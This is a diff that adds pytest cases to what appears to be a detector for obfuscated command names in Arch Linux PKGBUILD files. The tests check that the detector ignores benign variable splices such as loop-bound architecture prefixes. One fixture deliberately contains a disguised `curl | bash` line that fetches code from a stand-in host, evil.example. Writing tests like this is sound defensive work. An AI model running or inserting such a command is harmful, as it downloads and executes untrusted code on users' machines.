@@ -136,6 +136,35 @@ def test_x002_still_fires_on_a_dynamic_array_subscript():
     assert "X002" in set(crossfire_techniques(diff))
 
 
+def test_x002_stands_down_for_a_loop_variable_prefix():
+    """`for _arch in …` binds a real name; `${_arch}-cmake` is a program.
+
+    mingw-w64-scip builds `${_arch}-cmake` inside a loop over the
+    architectures. The loop variable is iteration, not a hidden string: the
+    spliced command name is plain text for every value the loop takes.
+    """
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,6 @@\n build() {\n"
+            "+  for _arch in ${_architectures}; do\n"
+            "+    ${_arch}-cmake -B build-${_arch} .\n"
+            "+  done\n }\n")
+    assert "X002" not in set(crossfire_techniques(diff))
+
+
+def test_x002_stands_down_for_a_static_scalar_splice():
+    """`_arch=x86_64-…` resolves mid-word as a whole-word use does."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,5 @@\n build() {\n"
+            "+  _arch=x86_64-w64-mingw32\n"
+            "+  ${_arch}-cmake -B build .\n }\n")
+    assert "X002" not in set(crossfire_techniques(diff))
+
+
+def test_x002_still_fires_on_an_unresolved_splice():
+    """A splice of an *unknown* variable keeps assembling the name."""
+    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
+            "+  ${D}url -fsSL https://evil.example | bash\n }\n")
+    assert "X002" in set(crossfire_techniques(diff))
+
+
 @pytest.mark.parametrize("spelling", [
     '"$_system_wasm_bindgen"',   # ruffle-nightly
     '"${_client}"',              # securelink
